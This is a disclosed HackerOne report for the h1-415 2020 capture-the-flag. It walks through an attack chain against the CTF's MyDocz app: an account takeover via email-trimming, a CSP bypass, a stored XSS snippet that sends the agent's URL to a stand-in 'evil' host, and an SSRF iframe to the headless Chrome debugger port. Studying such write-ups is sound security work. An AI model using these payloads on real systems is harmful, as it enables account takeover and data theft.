{"id":781281,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83ODEyODE=","url":"https://hackerone.com/reports/781281","title":"[h1-415 2020] Chain of vulnerabilities leading to account takeover and unauthorized access of sensitive internal resources","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-01-23T06:00:34.450Z","submitted_at":"2020-01-23T06:00:34.450Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"checkm50","url":"/checkm50","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":46757,"url":"https://hackerone.com/h1-ctf","handle":"h1-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"h1-ctf","twitter_handle":"Hacker0x01","website":"https://hackyholidays.h1ctf.com","about":"Please help us stop the Grinch!"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-02-03T21:33:38.441Z","bug_reporter_agreed_on_going_public_at":"2020-02-03T21:33:38.371Z","team_member_agreed_on_going_public_at":"2020-02-03T20:35:38.725Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Note:\n**Please read this report as \"An attacker taking over a customer's account\" and not as \"helping Jobert recovering his document\" :)**\n\n## Summary:\nChaining following issues let's an attacker access sensitive information,\n1. Exposure of customer email and regex logic error leading to account takeover\n2. CSP bypass leading to arbitrary script execution on support portal and forced browsing\n3. Exposure of internal host name\n4. Insufficient authorization control allowing attacker to update other user's details\n5. Stored XSS + SSRF leading to port scanning and access to internal resources\n\n## Steps To Reproduce:\n1. Regex logic error leading to account takeover - jobert@mydocz.cosmic email exposed in source code\n   1a. 'jobert@mydocz.cosmic' seems to be a customer of MyDocz and the system does not allow any new registration with same email ID\n   1b. Turn BurpSuite intercept on and capture following request,\n         https://h1-415.h1ctf.com/register\n   1c. Modify the email ID parameter as 'jobert@mydocz.cosmic\u003c' , the flaw here is the QR code generation process trims following symbols \n         {\u003c\u003e}\n   1d. Now after registration, save the QR code that the system generates\n   1e. Logout of the application and navigate to https://h1-415.h1ctf.com/recover\n   1f. Select the QR code saved previously and **now you have become jobert@mydocz.cosmic**\n\n2. CSP bypass leading to arbitrary script execution on support portal and forced browsing\n     2a. Support portal is vulnerable to HTML injection. One can bypass CSP rules like this\n     https://raw.githack.com/mattboldt/typed.js/master/lib/@https://github.com/checkm50/checkm50.github.io/master/40.js\n     2b. This triggers script execution on support portal but it is self-xss\n     2c. Now right click on firefox/chrome and run following function,\n           showReviewModal()\n     2d. Rating 1 star makes the support agent review the chat logs and hence the script can be executed on agent's client\n     2e. With a crafted script like below (Same as the script on 40.js), an attacker and gain information about the URL that the support agent \n      is using,\n      ```loc = document.location\n      var img1 = document.createElement('img');\n      img1.src = 'http://evil/image.png?loc='+loc\n      document.body.appendChild(img1);```\n\n3. Exposure of internal host name and user agent\n    3a. After performing step 2e, the attacker can now see the internal URL that the agent is using,\n    https://localhost:3000/support/review/39b707f120c5fde356bf0f5daec51bee292d38862d2bc7d09ba032257365e2dd\n    3b. Attacker can change the 'localhost:3000' to 'h1-415.h1ctf.com' in order to access the chat page that the support agent is viewing\n \n\n4. Insufficient authorization control allowing attacker to update other user's details,\nFor further attack we need two accounts. We already have one, an attacker can also create trial account. **We will refer to this account as second account**\n    4a. As you can see, the review page from step 3a. contains an option to update user details\n    4b. Attacker can now update second account's \"name\" field, using following POST call,\n          https://h1-415.h1ctf.com/support/review/39b707f120c5fde356bf0f5daec51bee292d38862d2bc7d09ba032257365e2dd\n          name=\u003cinject-here\u003e\u0026email=jobert%40mydocz.cosmic\u0026username=jobert\u0026user_id=\u003csecond account user_id\u003e\u0026_csrf_token=987d\n\n5. Stored XSS + SSRF leading to port scanning and access to internal resources\n     5a. From step 4b, we know that an attacker has to ability to update account information of another user\n     5b. This becomes worst because the attacker is also able to inject script like below\n     name=\u003cscript src='external.com/some.js'\u003e\u0026email=jobert%40mydocz.cosmic\u0026username=jobert\u0026user_id=6\u0026_csrf_token=987d\n     5c. An attacker can use this to inject an iframe like below and escalate the situation to SSRF (Port scanning and access internal resource)\n     name=\u003ciframe src='http://localhost:9222/json' width=900 height=900\u003e\u003c/iframe\u003e\n     5d. 9222 port because the user-agent says that it is headless chrome hence 9222 which is the debugger port\n     5e. the /json end point reveals a secret document\n\nThe secret document contains,\n## h1ctf{y3s_1m_c0sm1c_n0w}\n\n## Supporting Material/References:\n1. Support-portal.png\n2. chat-review-page.png\n3. external-interaction-ssrftest.png\n4. user-update-ssrf.png\n5. The-FLAG.png\n\nSpecial thanks to @pirateducky, @almadjus and @mcipekci  :)\n\n##Remediation:\nHire me :)\n\n## Impact\n\nAn attacker is able to, \nachieve **take over of customers account**, \n**compromise the integrity** of the platform by updating other user accounts\n**Infiltrate into internal network**\nresulting in **Critical** impact","vulnerability_information_html":"\u003cp\u003eNote:\u003cbr\u003e\n\u003cstrong\u003ePlease read this report as \u0026quot;An attacker taking over a customer\u0026#39;s account\u0026quot; and not as \u0026quot;helping Jobert recovering his document\u0026quot; :)\u003c/strong\u003e\u003c/p\u003e\n\n\u003ch2 id=\"summary\"\u003eSummary:\u003c/h2\u003e\n\n\u003cp\u003eChaining following issues let\u0026#39;s an attacker access sensitive information,\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eExposure of customer email and regex logic error leading to account takeover\u003c/li\u003e\n\u003cli\u003eCSP bypass leading to arbitrary script execution on support portal and forced browsing\u003c/li\u003e\n\u003cli\u003eExposure of internal host name\u003c/li\u003e\n\u003cli\u003eInsufficient authorization control allowing attacker to update other user\u0026#39;s details\u003c/li\u003e\n\u003cli\u003eStored XSS + SSRF leading to port scanning and access to internal resources\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003e\u003cp\u003eRegex logic error leading to account takeover - \u003ca title=\"jobert@mydocz.cosmic\" href=\"mailto:jobert@mydocz.cosmic\" rel=\"nofollow noopener noreferrer\"\u003ejobert@mydocz.cosmic\u003c/a\u003e email exposed in source code\u003cbr\u003e\n1a. \u0026#39;\u003ca title=\"jobert@mydocz.cosmic\" href=\"mailto:jobert@mydocz.cosmic\" rel=\"nofollow noopener noreferrer\"\u003ejobert@mydocz.cosmic\u003c/a\u003e\u0026#39; seems to be a customer of MyDocz and the system does not allow any new registration with same email ID\u003cbr\u003e\n1b. Turn BurpSuite intercept on and capture following request,\u003cbr\u003e\n     \u003ca title=\"https://h1-415.h1ctf.com/register\" href=\"/redirect?url=https%3A%2F%2Fh1-415.h1ctf.com%2Fregister\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://h1-415.h1ctf.com/register\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n1c. Modify the email ID parameter as \u0026#39;\u003ca title=\"jobert@mydocz.cosmic\" href=\"mailto:jobert@mydocz.cosmic\" rel=\"nofollow noopener noreferrer\"\u003ejobert@mydocz.cosmic\u003c/a\u003e\u0026lt;\u0026#39; , the flaw here is the QR code generation process trims following symbols \u003cbr\u003e\n     {\u0026lt;\u0026gt;}\u003cbr\u003e\n1d. Now after registration, save the QR code that the system generates\u003cbr\u003e\n1e. Logout of the application and navigate to \u003ca title=\"https://h1-415.h1ctf.com/recover\" href=\"/redirect?url=https%3A%2F%2Fh1-415.h1ctf.com%2Frecover\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://h1-415.h1ctf.com/recover\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n1f. Select the QR code saved previously and \u003cstrong\u003enow you have become \u003ca title=\"jobert@mydocz.cosmic\" href=\"mailto:jobert@mydocz.cosmic\" rel=\"nofollow noopener noreferrer\"\u003ejobert@mydocz.cosmic\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eCSP bypass leading to arbitrary script execution on support portal and forced browsing\u003cbr\u003e\n 2a. Support portal is vulnerable to HTML injection. One can bypass CSP rules like this\u003cbr\u003e\n \u003ca title=\"https://raw.githack.com/mattboldt/typed.js/master/lib/@https://github.com/checkm50/checkm50.github.io/master/40.js\" href=\"/redirect?url=https%3A%2F%2Fraw.githack.com%2Fmattboldt%2Ftyped.js%2Fmaster%2Flib%2F%40https%3A%2F%2Fgithub.com%2Fcheckm50%2Fcheckm50.github.io%2Fmaster%2F40.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://raw.githack.com/mattboldt/typed.js/master/lib/@https://github.com/checkm50/checkm50.github.io/master/40.js\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n 2b. This triggers script execution on support portal but it is self-xss\u003cbr\u003e\n 2c. Now right click on firefox/chrome and run following function,\u003cbr\u003e\n       showReviewModal()\u003cbr\u003e\n 2d. Rating 1 star makes the support agent review the chat logs and hence the script can be executed on agent\u0026#39;s client\u003cbr\u003e\n 2e. With a crafted script like below (Same as the script on 40.js), an attacker and gain information about the URL that the support agent \u003cbr\u003e\n  is using,\u003cbr\u003e\n  \u003ccode\u003eloc = document.location\u003cbr\u003e\n  var img1 = document.createElement(\u0026#39;img\u0026#39;);\u003cbr\u003e\n  img1.src = \u0026#39;http://evil/image.png?loc=\u0026#39;+loc\u003cbr\u003e\n  document.body.appendChild(img1);\u003c/code\u003e\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eExposure of internal host name and user agent\u003cbr\u003e\n3a. After performing step 2e, the attacker can now see the internal URL that the agent is using,\u003cbr\u003e\n\u003ca title=\"https://localhost:3000/support/review/39b707f120c5fde356bf0f5daec51bee292d38862d2bc7d09ba032257365e2dd\" href=\"/redirect?url=https%3A%2F%2Flocalhost%3A3000%2Fsupport%2Freview%2F39b707f120c5fde356bf0f5daec51bee292d38862d2bc7d09ba032257365e2dd\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://localhost:3000/support/review/39b707f120c5fde356bf0f5daec51bee292d38862d2bc7d09ba032257365e2dd\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n3b. Attacker can change the \u0026#39;localhost:3000\u0026#39; to \u0026#39;h1-415.h1ctf.com\u0026#39; in order to access the chat page that the support agent is viewing\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eInsufficient authorization control allowing attacker to update other user\u0026#39;s details,\u003cbr\u003e\nFor further attack we need two accounts. We already have one, an attacker can also create trial account. \u003cstrong\u003eWe will refer to this account as second account\u003c/strong\u003e\u003cbr\u003e\n4a. As you can see, the review page from step 3a. contains an option to update user details\u003cbr\u003e\n4b. Attacker can now update second account\u0026#39;s \u0026quot;name\u0026quot; field, using following POST call,\u003cbr\u003e\n      \u003ca title=\"https://h1-415.h1ctf.com/support/review/39b707f120c5fde356bf0f5daec51bee292d38862d2bc7d09ba032257365e2dd\" href=\"/redirect?url=https%3A%2F%2Fh1-415.h1ctf.com%2Fsupport%2Freview%2F39b707f120c5fde356bf0f5daec51bee292d38862d2bc7d09ba032257365e2dd\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://h1-415.h1ctf.com/support/review/39b707f120c5fde356bf0f5daec51bee292d38862d2bc7d09ba032257365e2dd\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n      name=\u0026lt;inject-here\u0026gt;\u0026amp;email=jobert%40mydocz.cosmic\u0026amp;username=jobert\u0026amp;user_id=\u0026lt;second account user_id\u0026gt;\u0026amp;_csrf_token=987d\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eStored XSS + SSRF leading to port scanning and access to internal resources\u003cbr\u003e\n 5a. From step 4b, we know that an attacker has to ability to update account information of another user\u003cbr\u003e\n 5b. This becomes worst because the attacker is also able to inject script like below\u003cbr\u003e\n name=\u0026lt;script src=\u0026#39;external.com/some.js\u0026#39;\u0026gt;\u0026amp;email=jobert%40mydocz.cosmic\u0026amp;username=jobert\u0026amp;user_id=6\u0026amp;_csrf_token=987d\u003cbr\u003e\n 5c. An attacker can use this to inject an iframe like below and escalate the situation to SSRF (Port scanning and access internal resource)\u003cbr\u003e\n name=\u0026lt;iframe src=\u0026#39;http://localhost:9222/json\u0026#39; width=900 height=900\u0026gt;\u0026lt;/iframe\u0026gt;\u003cbr\u003e\n 5d. 9222 port because the user-agent says that it is headless chrome hence 9222 which is the debugger port\u003cbr\u003e\n 5e. the /json end point reveals a secret document\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eThe secret document contains,\u003c/p\u003e\n\n\u003ch2 id=\"h1ctf-y3s_1m_c0sm1c_n0w\"\u003eh1ctf{y3s_1m_c0sm1c_n0w}\u003c/h2\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eSupport-portal.png\u003c/li\u003e\n\u003cli\u003echat-review-page.png\u003c/li\u003e\n\u003cli\u003eexternal-interaction-ssrftest.png\u003c/li\u003e\n\u003cli\u003euser-update-ssrf.png\u003c/li\u003e\n\u003cli\u003eThe-FLAG.png\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eSpecial thanks to \u003ca href=\"/pirateducky\"\u003e@pirateducky\u003c/a\u003e, \u003ca href=\"/almadjus\"\u003e@almadjus\u003c/a\u003e and \u003ca href=\"/mcipekci\"\u003e@mcipekci\u003c/a\u003e  :)\u003c/p\u003e\n\n\u003ch2 id=\"remediation\"\u003eRemediation:\u003c/h2\u003e\n\n\u003cp\u003eHire me :)\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAn attacker is able to, \u003cbr\u003e\nachieve \u003cstrong\u003etake over of customers account\u003c/strong\u003e, \u003cbr\u003e\n\u003cstrong\u003ecompromise the integrity\u003c/strong\u003e of the platform by updating other user accounts\u003cbr\u003e\n\u003cstrong\u003eInfiltrate into internal network\u003c/strong\u003e\u003cbr\u003e\nresulting in \u003cstrong\u003eCritical\u003c/strong\u003e impact\u003c/p\u003e\n","weakness":{"id":68,"name":"Server-Side Request Forgery (SSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-03-04T20:35:38.814Z","allow_singular_disclosure_after":-25870540.917494465,"singular_disclosure_allowed":true,"vote_count":9,"voters":["nytr0gen","defparam","0xacb","sameerphad72","prophet","nukedx","b9372d4605459ca97219795","raginx","hrw"],"severity":{"rating":"critical","score":9.0,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"required","scope":"changed","confidentiality":"high","integrity":"low","availability":"low"}},"structured_scope":{"databaseId":42751,"asset_type":"URL","asset_identifier":"https://h1-415.h1ctf.com","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":6847203,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Could you please add @almadjus as collaborator?","markdown_message":"\u003cp\u003eCould you please add \u003ca href=\"/almadjus\"\u003e@almadjus\u003c/a\u003e as collaborator?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-23T06:06:39.077Z","updated_at":"2020-01-23T06:08:16.322Z","actor":{"username":"checkm50","cleared":false,"url":"/checkm50","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6847416,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"You did it! Good work! \n\nalmadjus doesn't exist on HackerOne. Can you get me their username :)? ","markdown_message":"\u003cp\u003eYou did it! Good work! \u003c/p\u003e\n\n\u003cp\u003ealmadjus doesn\u0026#39;t exist on HackerOne. Can you get me their username :)? \u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-23T07:14:29.375Z","updated_at":"2020-01-23T07:14:29.375Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6849084,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot Ben :)\nThe name is al-madjus ","markdown_message":"\u003cp\u003eThanks a lot Ben :)\u003cbr\u003e\nThe name is al-madjus \u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-23T12:11:27.063Z","updated_at":"2020-01-23T12:11:27.063Z","actor":{"username":"checkm50","cleared":false,"url":"/checkm50","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6852656,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey there,\n\nJust a quick reminder to not post any writeups online until we announce the winners and request disclosure on your submission. \n\nThanks! ","markdown_message":"\u003cp\u003eHey there,\u003c/p\u003e\n\n\u003cp\u003eJust a quick reminder to not post any writeups online until we announce the winners and request disclosure on your submission. \u003c/p\u003e\n\n\u003cp\u003eThanks! \u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-23T18:13:03.775Z","updated_at":"2020-01-23T18:13:03.775Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6862446,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @nahamsec ,\nA gentle reminder to add @al-madjus :)","markdown_message":"\u003cp\u003eHi \u003ca href=\"/nahamsec\"\u003e@nahamsec\u003c/a\u003e ,\u003cbr\u003e\nA gentle reminder to add \u003ca href=\"/al-madjus\"\u003e@al-madjus\u003c/a\u003e :)\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-24T14:53:10.432Z","updated_at":"2020-01-24T14:53:10.432Z","actor":{"username":"checkm50","cleared":false,"url":"/checkm50","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6881192,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"hi @nahamsec ,\nA gentle reminder to add @al-madjus :)","markdown_message":"\u003cp\u003ehi \u003ca href=\"/nahamsec\"\u003e@nahamsec\u003c/a\u003e ,\u003cbr\u003e\nA gentle reminder to add \u003ca href=\"/al-madjus\"\u003e@al-madjus\u003c/a\u003e :)\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-27T15:34:45.189Z","updated_at":"2020-01-27T15:34:45.189Z","actor":{"username":"checkm50","cleared":false,"url":"/checkm50","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6934229,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @checkm50 - Apologies for not having the collaboration feature enabled for this CTF. I'll make a note of it and make sure we enable it for all of our CTFs moving forward. I'm going to go ahead and add @al-madjus right now.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/checkm50\"\u003e@checkm50\u003c/a\u003e - Apologies for not having the collaboration feature enabled for this CTF. I\u0026#39;ll make a note of it and make sure we enable it for all of our CTFs moving forward. I\u0026#39;m going to go ahead and add \u003ca href=\"/al-madjus\"\u003e@al-madjus\u003c/a\u003e right now.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-31T17:16:43.674Z","updated_at":"2020-01-31T17:16:43.674Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6934377,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2020-01-31T17:31:47.185Z","updated_at":"2020-01-31T17:31:47.185Z","actor":{"username":"al-madjus","cleared":false,"url":"/al-madjus","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/340/244/c9666ba3cc7b1d2720860b836b33fdacfa969b78_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6934770,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot @nahamsec :)\nWelcome @al-madjus :)","markdown_message":"\u003cp\u003eThanks a lot \u003ca href=\"/nahamsec\"\u003e@nahamsec\u003c/a\u003e :)\u003cbr\u003e\nWelcome \u003ca href=\"/al-madjus\"\u003e@al-madjus\u003c/a\u003e :)\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-31T18:01:04.541Z","updated_at":"2020-01-31T18:01:04.541Z","actor":{"username":"checkm50","cleared":false,"url":"/checkm50","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6934794,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for adding me :-)","markdown_message":"\u003cp\u003eThanks for adding me :-)\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-31T18:03:59.207Z","updated_at":"2020-01-31T18:03:59.207Z","actor":{"username":"al-madjus","cleared":false,"url":"/al-madjus","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/340/244/c9666ba3cc7b1d2720860b836b33fdacfa969b78_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6934795,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"You're welcome! Sorry we didn't get to it earlier.","markdown_message":"\u003cp\u003eYou\u0026#39;re welcome! Sorry we didn\u0026#39;t get to it earlier.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-31T18:04:04.251Z","updated_at":"2020-01-31T18:04:04.251Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6934806,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello Hackers! \n\nI just wanted to update everyone that we are in the process of selecting our winners. We should have an announcement out early next week! Thank you for your patience and happy hacking! ","markdown_message":"\u003cp\u003eHello Hackers! \u003c/p\u003e\n\n\u003cp\u003eI just wanted to update everyone that we are in the process of selecting our winners. We should have an announcement out early next week! Thank you for your patience and happy hacking! \u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-31T18:04:59.253Z","updated_at":"2020-01-31T18:04:59.253Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6953834,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-03T20:32:39.396Z","updated_at":"2020-02-03T20:32:39.396Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"checkm50","url":"/checkm50"},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6953860,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-03T20:35:38.747Z","updated_at":"2020-02-03T20:35:38.747Z","first_to_agree":true,"actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6954318,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks for the quick fix team. Let’s disclose since the issues are fixed :)","markdown_message":"\u003cp\u003eThanks for the quick fix team. Let’s disclose since the issues are fixed :)\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-03T21:33:38.393Z","updated_at":"2020-02-03T21:33:38.393Z","actor":{"username":"checkm50","cleared":false,"url":"/checkm50","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6954319,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-03T21:33:38.460Z","updated_at":"2020-02-03T21:33:38.460Z","actor":{"username":"checkm50","cleared":false,"url":"/checkm50","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8236809,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-08T21:12:39.598Z","updated_at":"2020-06-08T21:12:39.598Z","additional_data":{"old_title":"Chain of vulnerabilities leading to account takeover and unauthorized access of sensitive internal resources","new_title":"[h1-415 2020] Chain of vulnerabilities leading to account takeover and unauthorized access of sensitive internal 